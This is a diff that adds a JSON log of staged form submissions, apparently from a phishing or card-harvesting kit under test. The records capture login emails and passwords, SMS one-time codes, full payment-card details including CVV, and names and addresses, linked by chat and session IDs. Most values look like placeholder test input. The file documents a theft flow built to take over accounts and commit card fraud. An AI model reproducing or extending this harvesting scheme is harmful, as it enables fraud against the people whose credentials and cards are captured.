@@ -1,0 +1,261 @@
+[
+  {
+    "chatId": 7988765012,
+    "estado": "inicio",
+    "mensaje": "Hola",
+    "fecha": "2026-04-29T13:28:19.602Z"
+  },
+  {
+    "chatId": 7988765012,
+    "estado": "sms",
+    "mensaje": "000000",
+    "fecha": "2026-04-29T13:29:25.249Z"
+  },
+  {
+    "chatId": 7988765012,
+    "estado": "sms",
+    "mensaje": "000000",
+    "fecha": "2026-04-29T13:29:36.194Z"
+  },
+  {
+    "chatId": 7988765012,
+    "estado": "sms",
+    "mensaje": "738383",
+    "fecha": "2026-04-29T19:44:15.738Z"
+  },
+  {
+    "etape": 1,
+    "email": "test.de",
+    "password": "tryukil",
+    "chatId": "7988765012",
+    "date": "2026-04-30T12:06:06.905Z"
+  },
+  {
+    "etape": 2,
+    "smsCode": "545454",
+    "chatId": "7988765012",
+    "date": "2026-04-30T12:06:45.317Z"
+  },
+  {
+    "etape": 3,
+    "cardName": "dgfdggd",
+    "cardNumber": "4901 1700 1511 3643",
+    "expiry": "12/29",
+    "cvv": "555",
+    "cardBrand": "visa",
+    "chatId": "7988765012",
+    "date": "2026-04-30T12:07:42.462Z"
+  },
+  {
+    "etape": 4,
+    "firstName": "gfhjkjgh",
+    "lastName": "gfhjklk",
+    "address": "dfghjkl",
+    "birthYear": "5655",
+    "postalCode": "5545454",
+    "chatId": "7988765012",
+    "date": "2026-04-30T12:08:05.296Z"
+  },
+  {
+    "etape": 1,
+    "email": "fdghjkgf",
+    "password": "dfghjkl",
+    "chatId": "7988765012",
+    "date": "2026-04-30T12:09:01.677Z"
+  },
+  {
+    "etape": 1,
+    "email": "testyar@test.de",
+    "password": "dfghjkl",
+    "sessionId": "2352f26c-03a3-4a97-8eac-12542e2d7079",
+    "date": "2026-04-30T12:27:48.493Z"
+  },
+  {
+    "etape": 2,
+    "smsCode": "544554",
+    "sessionId": "2352f26c-03a3-4a97-8eac-12542e2d7079",
+    "date": "2026-04-30T12:28:09.490Z"
+  },
+  {
+    "etape": 2,
+    "smsCode": "222222",
+    "sessionId": "2352f26c-03a3-4a97-8eac-12542e2d7079",
+    "date": "2026-04-30T12:28:25.071Z"
+  },
+  {
+    "etape": 3,
+    "cardName": "test bro",
+    "cardNumber": "5461 3100 2857 1689",
+    "expiry": "12/29",
+    "cvv": "122",
+    "cardBrand": "visa",
+    "sessionId": "2352f26c-03a3-4a97-8eac-12542e2d7079",
+    "date": "2026-04-30T12:29:17.449Z"
+  },
+  {
+    "etape": 3,
+    "cardName": "test bro",
+    "cardNumber": "5461 3100 2857 1689",
+    "expiry": "12/29",
+    "cvv": "122",
+    "cardBrand": "visa",
+    "sessionId": "2352f26c-03a3-4a97-8eac-12542e2d7079",
+    "date": "2026-04-30T12:29:27.110Z"
+  },
+  {
+    "etape": 3,
+    "cardName": "test bro",
+    "cardNumber": "5461 3100 2857 1689",
+    "expiry": "12/29",
+    "cvv": "122",
+    "cardBrand": "visa",
+    "sessionId": "2352f26c-03a3-4a97-8eac-12542e2d7079",
+    "date": "2026-04-30T12:29:27.113Z"
+  },
+  {
+    "etape": 1,
+    "email": "test2020@test.de",
+    "password": "test2025",
+    "sessionId": "dc94ce21-b604-4c33-8e16-60c5c7aa7075",
+    "date": "2026-04-30T12:34:26.067Z"
+  },
+  {
+    "etape": 1,
+    "email": "test2020@test.de",
+    "password": "test2025",
+    "sessionId": "08b56e4b-0a0e-4c5a-b9b9-a6998bdc4e6c",
+    "date": "2026-04-30T12:35:06.345Z"
+  },
+  {
+    "etape": 2,
+    "smsCode": "222222",
+    "sessionId": "08b56e4b-0a0e-4c5a-b9b9-a6998bdc4e6c",
+    "date": "2026-04-30T12:35:36.972Z"
+  },
+  {
+    "etape": 2,
+    "smsCode": "111111",
+    "sessionId": "08b56e4b-0a0e-4c5a-b9b9-a6998bdc4e6c",
+    "date": "2026-04-30T12:36:32.037Z"
+  },
+  {
+    "etape": 3,
+    "cardName": "test ahmas",
+    "cardNumber": "5461 3100 2857 1689",
+    "expiry": "12/29",
+    "cvv": "222",
+    "cardBrand": "visa",
+    "sessionId": "08b56e4b-0a0e-4c5a-b9b9-a6998bdc4e6c",
+    "date": "2026-04-30T12:37:30.332Z"
+  },
+  {
+    "etape": 1,
+    "email": "test@tes.de",
+    "password": "gfhjkl",
+    "sessionId": "dc0c9d5c-8e7e-4a7b-a1ea-d7d9d7e2d055",
+    "date": "2026-04-30T12:50:35.483Z"
+  },
+  {
+    "etape": 1,
+    "email": "test@tes.de",
+    "password": "gfhjkl",
+    "sessionId": "5a2da5fd-02cb-434e-be0c-c1e14ab9d1da",
+    "date": "2026-04-30T12:50:43.596Z"
+  },
+  {
+    "etape": 2,
+    "smsCode": "111111",
+    "sessionId": "5a2da5fd-02cb-434e-be0c-c1e14ab9d1da",
+    "date": "2026-04-30T12:50:52.430Z"
+  },
+  {
+    "etape": 3,
+    "cardName": "teste dche",
+    "cardNumber": "1155 4545 4545 4555",
+    "expiry": "12/29",
+    "cvv": "111",
+    "cardBrand": "mastercard",
+    "sessionId": "5a2da5fd-02cb-434e-be0c-c1e14ab9d1da",
+    "date": "2026-04-30T12:51:25.304Z"
+  },
+  {
+    "etape": 1,
+    "email": "fghjkl",
+    "password": "fghjkl",
+    "sessionId": "f30977f9-45ab-4b33-8fe3-fd1895edf926",
+    "date": "2026-04-30T12:51:57.173Z"
+  },
+  {
+    "etape": 1,
+    "email": "fghjkl",
+    "password": "dfdfdf",
+    "sessionId": "f67e3e94-0ac8-4d81-bea8-b743f573baf9",
+    "date": "2026-04-30T12:52:12.400Z"
+  },
+  {
+    "etape": 2,
+    "smsCode": "544554",
+    "sessionId": "f67e3e94-0ac8-4d81-bea8-b743f573baf9",
+    "date": "2026-04-30T12:52:22.494Z"
+  },
+  {
+    "etape": 3,
+    "cardName": "tyygh",
+    "cardNumber": "5461 3100 2857 1689",
+    "expiry": "45/45",
+    "cvv": "4554",
+    "cardBrand": "visa",
+    "sessionId": "f67e3e94-0ac8-4d81-bea8-b743f573baf9",
+    "date": "2026-04-30T12:52:55.980Z"
+  },
+  {
+    "etape": 4,
+    "firstName": "dfghj",
+    "lastName": "dfghj",
+    "address": "dfghj",
+    "birthYear": "dfgh",
+    "postalCode": "dfghjk",
+    "sessionId": "f67e3e94-0ac8-4d81-bea8-b743f573baf9",
+    "date": "2026-04-30T12:53:11.290Z"
+  },
+  {
+    "etape": 1,
+    "email": "gfvv@test.de",
+    "password": "dfghjk",
+    "sessionId": "7f411a3e-6737-4205-bda9-64b79cd69762",
+    "date": "2026-04-30T14:51:48.252Z"
+  },
+  {
+    "etape": 1,
+    "email": "gfvv@test.de",
+    "password": "dfghjk",
+    "sessionId": "3d92d729-5b72-46d2-b0af-91ea806461c4",
+    "date": "2026-04-30T14:52:04.228Z"
+  },
+  {
+    "etape": 2,
+    "smsCode": "221515",
+    "sessionId": "3d92d729-5b72-46d2-b0af-91ea806461c4",
+    "date": "2026-04-30T14:52:12.645Z"
+  },
+  {
+    "etape": 4,
+    "firstName": "tyui",
+    "lastName": "rtyu",
+    "address": "tryu",
+    "birthYear": "1999",
+    "postalCode": "11111",
+    "sessionId": "3d92d729-5b72-46d2-b0af-91ea806461c4",
+    "date": "2026-04-30T14:52:46.097Z"
+  },
+  {
+    "etape": 4,
+    "firstName": "tyui",
+    "lastName": "rtyu",
+    "address": "tryu",
+    "birthYear": "1999",
+    "postalCode": "11111",
+    "sessionId": "3d92d729-5b72-46d2-b0af-91ea806461c4",
+    "date": "2026-04-30T14:53:00.279Z"
+  }
+]
